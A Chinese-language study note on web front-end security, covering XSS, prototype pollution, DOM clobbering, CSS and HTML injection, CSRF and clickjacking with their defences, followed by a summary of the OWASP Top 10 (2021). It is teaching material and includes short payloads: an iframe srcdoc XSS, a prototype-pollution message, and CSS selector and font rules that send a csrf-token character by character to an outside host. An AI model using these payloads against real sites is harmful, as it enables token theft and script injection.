## 前端安全

参考 https://aszx87410.github.io/beyond-xss

### XSS跨站脚本攻击

XSS （cross-site-scripting）是最常见的前端（web）攻击手段，虽然名字中有跨站，但实际上只要在网页中执行了任意不在期望范围内的脚本的行为都属于XSS的范畴

#### XSS分类

1. 反射型，通常构造恶意的url来触发，如果代码中读取了url中的值就有可能会触发
2. 持久性，通常是服务器接收到了恶意输入并且存储起来，在后续请求中仍然有可能传送给用户，这种方式的XSS影响范围广危害性大
3. DOM型，通常是前端脚本接收了一些恶意的输入导致页面DOM发生改变，触发脚本执行

除此之外，还有一些更厉害的脚本攻击，它们利用的不是网页的漏洞而是浏览器本身及其插件的漏洞，被称为 Universal XSS。

#### 如何执行脚本

1. 通过`<script>`标签
   直接通过 `innerHTML`来注入`<script>`标签并不会生效，但是下面这种方式就可以：`document.body.innerHTML = '<iframe srcdoc="&lt;script>alert(1)&lt;/script>"></iframe>'`
2. 通过内联事件，例如`onload`, `onanmiationstart`...等
3. 通过`javascript:`伪协议（包括`data:`）

   - JavaScript伪协议可以用于`src`,`href`,`action`,`formaction`等很多接收地址的地方，例如Vue的文章关于安全这一块就指出了[相关例子](https://vuejs.org/guide/best-practices/security.html#potential-dangers)
   - 另一个有风险的地方是在页面跳转的时候，例如`window.location = 'javascript:alert(1)'`，攻击者可以在窃取信息之后再做正常跳转

   所以在涉及到url注入的地方一定要小心，可以借助[sanitize-url](https://github.com/braintree/sanitize-url)来过滤掉伪协议；处理URL的时候使用`new URL`的方式而不是自己处理

[这个站点](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)总结了相当多的构造方式，并且得益于JavaScript的灵活性，你可以通过Unicode编码、URL编码、HTML实体编码、动态构造等多种手段来装饰XSS注入内容

#### 如何防范

1. 过滤和编码。
   最基本也最重要的方法就是对用户输入进行**编码**和**过滤**，**前后端都需要**使用可靠的第三方库对用户的所有可能的输入以及后端的输出进行编码和过滤（实际上有时碍于业务限制无法对输入进行彻底的编码，这样会损失原始信息），例如[DOMPurify](https://github.com/cure53/DOMPurify)，并且要用正确的使用方式（配置正确的选项）以及避免对已经过滤的结果再做处理。

   浏览器也推出了类似的API（不稳定）：[Sanitizer](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer)，它的过滤更加苛刻。

   [Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)可以增加诸如`innerHTML`, `document.write`, `insertAdjacentHTML`等方式的安全性。需要在CSP中启用相关策略之后，这些有风险的API就无法接收字符串作为输入而是需要 `TrustedHTML` 类型的数据。

   经过可信的三方库编码之后的结果也并不是完全可信的，有一类针对sanitizer的攻击叫做mutation based XSS，原理大概是字符串的html被插入到真实dom之后的结构并非一定跟字符串呈现的结构一致，也就是需要遵循html的解析规范，这就会导致sanitizer相关的库基于字符串解析判断是安全的内容有可能在浏览器那里变成可能的XSS攻击

   另外程序使用的数据来源不只是来自用户输入，一些敏感的属性同样要警惕使用，例如`window.name`, `window.location`, `document.URL`, `document.referrer`等等，并且严禁使用动态执行，如`eval`, `setTimeout(string)`, `new Function`等

2. 启用 [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)。
   CSP（[Content Security Policy](https://content-security-policy.com/)）可以对浏览器可以执行什么以及资源来源进行限制。CSP可以通过http header或者使用meta标签（有限制）进行设置。CSP具备一定的实施成本，因为它的策略相当多并且还处于不断完善的过程中，如果配置不完善或者不经常维护和测试也容易留下可以绕过的漏洞，或者对页面运行产生影响。

3. 增加XSS的后序攻击成本。
   通常来讲XSS是攻击的前序步骤，假设XSS攻击已经发生，我们仍然可以增加其他方面的安全性来降低XSS的风险。例如增加验证的步骤或难度，安全的存储token，后端限制token的有效范围、期限等

### 原型链污染

JavaScript代码一般都是源码分发，攻击者可以找出能够污染原型的地方，从而达到攻击的目的。

举个例子：

```js
function handleMessage(event) {
  const { x, y, color } = event.data
  // 构造消息：`data: { y: '__proto__', x: 'html', color: true } `
  screen[y][x] = color
}
function createElement(config) {
  const element = document.createElement(config.tag)
  if (config.html) {
    // 这样这里的if总是为true，就会执行innerHTML操作
    element.innerHTML = config.content
  } else {
    element.innerText = config.content
  }
  return element
}
```

### DOM clobbering

这种攻击的原理就是如果存在带有id的dom，那么window上面也会有id同名的属性，这样就有可能影响到JavaScript代码。下面几种方式也都可以创建全局变量，并且也会在`document`上创建相同的属性：

```html
<embed name="b"></embed>
<form name="c"></form>
<img name="d" />
<object name="e"></object>
<iframe name="f"></iframe>
```

例如

```html
<form id="config">
  <input name="env" value="test" />
</form>
<script>
  if (config.env.value === 'test') {
    // 会触发此处逻辑
  }
</script>
```

[这个工具](https://splitline.github.io/DOM-Clobber3r/)可以帮你构造多层属性访问的html

### 模板注入

模板引擎在前后端都有广泛的使用，它们的插值部分一般都支持动态执行一段语句，通过精心构造可以触发代码执行，这和SQL注入的原理是很像的，包括XSS本身也都主要依靠注入来实现

### CSS注入

一般情况下，我们认为`style`标签是安全的，但是它也有泄露信息的可能，例如

```css
input[name="csrf-token"][value^="a"] {
  background: url(https://myserver.com?q=a)
}

input[name="csrf-token"][value^="b"] {
  background: url(https://myserver.com?q=b)
}

input[name="csrf-token"][value^="c"] {
  background: url(https://myserver.com?q=c)
}

...

```

另外可以利用`@import url()`，它可以动态引入css，并且可以嵌套（返回的css仍然可以用@import），这样的话我们可以等待第一个字符猜测命中后，再让服务器返回第二个字符猜测的css响应

除了这种方式之外，还有其他很tricky的方式让css命中背景图发送，例如：

```css
@font-face {
  font-family: 'f1';
  src: url(https://myserver.com?q=1);
  unicode-range: U+31;
}
```

css自定义字体中可以根据文本的字符范围`unicode-range`来请求不同的字体，这样我们可以猜测某个元素下大致的内容。
另外我们可以通过构造特定样式的字体文件，通过设置字体的尺寸让某些文字出现时出现滚动条，再设置滚动条出现时的背景图，也可以猜测文本内容。

### HTML注入

如果我们有机会在页面上注入普通的html，那么就有机会模拟页面的某一部分来达到欺骗的目的。

另外也可以利用html解析规范的容错机制来构造请求，例如：

```html
<div>
  Hello, <?php echo $_GET['q']; ?>
  <div>Your account balance is: 1337</div>
  <footer><img src="footer.png" /></footer>
</div>
```

在PHP注入点传入`<img src="http://example.com?q=`，这样账户余额都会成为图片src的一部分。（此例在chrome下已被修复）

### CSRF跨站请求伪造

Cross-Site Request Forgery，在用户登录了某个网站之后，攻击者诱使用户做了一些操作，而这些操作触发了对已登录网站的请求，这里的请求是用户不知情发出的，这就是跨站请求伪造。

常见的防御手段：

- 检查`Referer`和`Origin`，并且还加入一些自定义header做校验
- 对于敏感操作加入人机验证机制，如验证码
- 请求时携带上csrf token并需要后端校验
- cookie-token双重验证，我们可以把同一份token在请求时添加到header中，同时在cookie中也注入相同的token，这样后端在收到请求时可以校验两个来源的token是否一致。这依赖于攻击者一般无法获取cookie这个前提。
- 使用JWT来做身份验证，它跟token的思想差不多，只不过它主要功能是用来验证用户身份，同时也可以有效避免CSRF攻击
- SameSite cookie，现代浏览器都已经默认启用。**即便如此上述的防御措施仍然是必要的。**

### 点击劫持

这通常发生在恶意页面嵌入了正常页面，通过css等手段让正常页面不可见，但是仍然可以接收点击等事件，以此达到欺骗的目的。

防范点击劫持可以通过禁止自己的页面被嵌套，可以利用`top !== self`，或者设置`X-Frame-Options`，或者使用CSP的`frame-ancestors`指令等方式

另外对于重要敏感的操作，可以使用二次提示等方式增加点击劫持的难度

### 其他的攻击

- 资源嗅探攻击
- 供应链投毒
- 旁路攻击
- DDoS
- 反爬虫

---

https://owasp.org/www-project-top-ten/
Web安全问题详解
=========

## A01:2021-访问控制缺陷 (Broken Access Control)

访问控制缺陷从先前的第五位上升到首位，94%的测试应用程序存在某种形式的访问控制问题。与此类别相关的34种常见弱点枚举(CWEs)在应用程序中出现的频率高于任何其他类别。

**详细解释**： 访问控制确保用户只能执行其权限范围内的操作。当这一机制失效时，未授权用户可能能够访问、修改或删除他们本不应访问的数据，执行他们不应有权限的功能。

**常见问题**：

- 未正确验证用户权限
- URL参数篡改绕过权限检查
- API缺乏适当的访问控制
- 通过提升权限访问未授权资源
- 元数据操作(如重放或篡改JWT令牌)
- CORS配置错误允许未授权访问

**防御措施**：

- 实施最小权限原则
- 禁用默认共享和访问
- 在服务器端实施访问控制逻辑，而非仅依赖客户端
- 记录访问控制失败并提醒管理员
- 统一使用访问控制机制

## A02:2021-加密失效 (Cryptographic Failures)

加密失效上升一位至第二位，先前被称为"敏感数据泄露"，后者更多是描述症状而非根本原因。现在重点关注与加密相关的失败，这常常导致敏感数据泄露或系统被攻破。

**详细解释**： 此类问题涉及加密实现的失效，可能导致敏感信息泄露或被攻破。包括使用弱加密算法、密钥管理不当、加密协议实现错误等。

**常见问题**：

- 以明文传输敏感数据
- 使用过时或弱加密算法
- 默认或弱密钥的使用
- 缺少适当的密钥管理
- 不恰当的证书验证
- 随机数生成不够安全

**防御措施**：

- 识别并正确保护所有敏感数据
- 实施强大的加密算法与协议
- 存储密码时使用强哈希算法与加盐
- 确保加密通信(TLS)安全配置
- 禁用缓存敏感数据的功能

## A03:2021-注入攻击 (Injection)

注入攻击下滑至第三位。94%的应用程序被测试存在某种形式的注入漏洞，与此类别相关的33个CWEs在应用程序中出现频率仅次于访问控制问题。在此版本中，跨站脚本攻击(XSS)也被归入此类。

**详细解释**： 注入攻击发生在不受信任的数据被发送到解释器作为命令或查询的一部分时。攻击者的恶意数据可以诱使解释器执行非预期命令或未经授权访问数据。

**常见类型**：

- SQL注入
- NoSQL注入
- OS命令注入
- LDAP注入
- XPath注入
- 跨站脚本攻击(XSS)
- 模板注入

**防御措施**：

- 使用参数化查询
- 验证和净化所有输入数据
- 使用ORM框架
- 实施内容安全策略(CSP)防御XSS
- 应用最小权限原则

## A04:2021-不安全设计 (Insecure Design)

不安全设计是2021版新增的类别，聚焦于设计缺陷相关的风险。如果行业真正想要实现"左移"(即在开发周期早期解决安全问题)，就需要更多地使用威胁建模、安全设计模式和原则以及参考架构。

**详细解释**： 不安全设计指的是在软件设计阶段未充分考虑安全问题，导致系统架构层面存在漏洞。即使完美实现代码，这些缺陷也难以通过实施或测试修复。

**常见问题**：

- 缺乏威胁建模
- 设计中未考虑攻击场景
- 缺少业务逻辑限制
- 不安全的默认配置
- 过度信任客户端

**防御措施**：

- 建立安全设计流程
- 使用安全开发生命周期(SDLC)
- 建立与使用安全设计模式库
- 进行威胁建模
- 集成安全语言、框架和组件

## A05:2021-安全配置错误 (Security Misconfiguration)

安全配置错误从上一版的第6位上升，90%的应用程序被测试存在某种形式的配置错误。随着更多系统转向高度可配置的软件，这个类别上升并不令人意外。先前的XML外部实体(XXE)类别现在也是此类别的一部分。

**详细解释**： 安全配置错误是指系统、框架、应用服务器或平台的不安全配置。这可能源于使用默认配置、不完整配置、开放云存储、错误的HTTP头配置或包含敏感信息的错误消息。

**常见问题**：

- 使用默认账户和密码
- 未使用的功能仍然启用
- 错误处理暴露堆栈跟踪或其他敏感信息
- 最新安全功能未启用或配置不当
- 服务器软件过时
- XML处理器允许XXE攻击

**防御措施**：

- 安全强化过程
- 可重复的安全配置部署流程
- 最小化平台
- 定期审查和更新配置
- 分段应用架构

## A06:2021-易受攻击和过时组件 (Vulnerable and Outdated Components)

易受攻击和过时组件之前的名称是"使用已知漏洞的组件"，在社区调查中排名第2，同时通过数据分析也确认其应位列前十。该类别从2017年的第9位上升，这是一个我们在测试和风险评估方面一直存在挑战的问题。

**详细解释**： 使用存在已知安全漏洞的组件会削弱应用程序的防御能力，并可能导致各种攻击。这包括前端和后端的组件，如库、框架和其他软件模块。

**常见问题**：

- 未知组件版本
- 软件过时或不受支持
- 不定期扫描漏洞
- 未及时修补或升级底层平台、框架和依赖项
- 开发者未测试组件兼容性
- 组件配置不安全

**防御措施**：

- 移除未使用的依赖项 -持续监控组件安全漏洞
- 只从官方源获取组件
- 计划并实施补丁管理策略
- 使用软件物料清单(SBOM)管理依赖项

## A07:2021-身份识别和认证失败 (Identification and Authentication Failures)

身份识别和认证失败之前被称为"认证破坏"，从第二位下滑，现在包括更多与身份识别失败相关的CWEs。这一类别仍然是前十的重要组成部分，但标准化框架的增加似乎有所帮助。

**详细解释**： 身份识别和认证失败包括用户身份确认、认证和会话管理方面的问题，这些可能允许攻击者暂时或永久地假冒其他用户。

**常见问题**：

- 允许自动化攻击如凭证填充
- 允许弱密码
- 不安全的凭证恢复机制
- 会话标识符暴露在URL中
- 会话固定攻击
- 缺少多因素认证
- 会话超时设置不当

**防御措施**：

- 实施多因素认证
- 避免使用默认凭证
- 实施强密码策略
- 限制失败登录尝试
- 使用安全的会话管理
- 服务器端会话验证

## A08:2021-软件和数据完整性失败 (Software and Data Integrity Failures)

软件和数据完整性失败是2021年新增类别，关注在不验证完整性的情况下对软件更新、关键数据和CI/CD管道做出假设的问题。在映射到此类别的10个CWEs中，这是CVE/CVSS数据中权重最高的影响之一。2017年的"不安全的反序列化"现在成为这个更大类别的一部分。

**详细解释**： 软件和数据完整性失败指的是代码和基础设施不能保护软件和数据完整性的情况。这包括没有验证软件更新、敏感数据或CI/CD管道的完整性的情况。

**常见问题**：

- 使用来自不受信任源的库和依赖项
- 不安全的CI/CD管道
- 自动更新没有充分的完整性验证
- 不安全的反序列化
- 使用未签名或未验证的数据

**防御措施**：

- 使用数字签名验证软件或数据的真实性
- 确保依赖项从安全的仓库获取
- 确保CI/CD管道有适当的隔离、配置和访问控制
- 验证序列化对象来自可信源
- 避免反序列化来自不可信源的数据

## A09:2021-安全日志和监控失败 (Security Logging and Monitoring Failures)

安全日志和监控失败之前被称为"不足的日志记录和监控"，从行业调查中添加(排名第3)，从之前的第10位上升。这个类别扩展包括更多类型的失败，测试具有挑战性，在CVE/CVSS数据中表现不佳。但是，此类别的失败可以直接影响可见性、事件警报和取证。

**详细解释**： 缺乏足够的日志记录、检测、监控和响应允许攻击者进一步攻击系统、维持持久性、转向更多系统并篡改、提取或销毁数据。

**常见问题**：

- 未记录登录、访问控制失败和输入验证失败等审计事件
- 警告和错误产生不足或不清晰的日志消息
- 应用程序未监控系统完整性
- 日志仅存储在本地
- 缺乏适当的实时监控和告警
- 未建立或未有效测试事件响应计划

**防御措施**：

- 记录所有登录、访问控制和服务器端输入验证失败
- 确保日志格式允许日志管理系统易于使用
- 确保高价值交易有审计追踪
- 建立有效的监控和告警
- 制定和测试事件响应和恢复计划

## A10:2021-服务器端请求伪造 (Server-Side Request Forgery)

服务器端请求伪造是从社区调查中添加的(排名第1)。数据显示其发生率相对较低，测试覆盖率高于平均水平，同时利用和影响潜力评级也高于平均水平。这个类别代表了安全社区成员告诉我们很重要的问题，尽管目前数据还没有完全显示出来。

**详细解释**： SSRF缺陷发生在web应用程序从远程资源获取数据时没有验证用户提供的URL。这允许攻击者强制应用程序向意外目标发送请求，即使受防火墙、VPN或其他网络访问控制列表(ACL)保护。

**常见问题**：

- 应用程序获取远程资源而不验证用户提供的URL
- 云服务中的SSRF风险更大，因为云提供围绕实例的元数据服务
- 可以利用服务器请求到内部服务访问内网
- 可以访问云服务提供商的元数据端点

**防御措施**：

- 从应用层进行网络分段
- 严格实施防火墙策略
- 禁用不需要的HTTP重定向
- 验证和强制通过DNS解析的URL主机名
- 对允许的URL使用允许列表
- 不要将原始响应发送给客户端
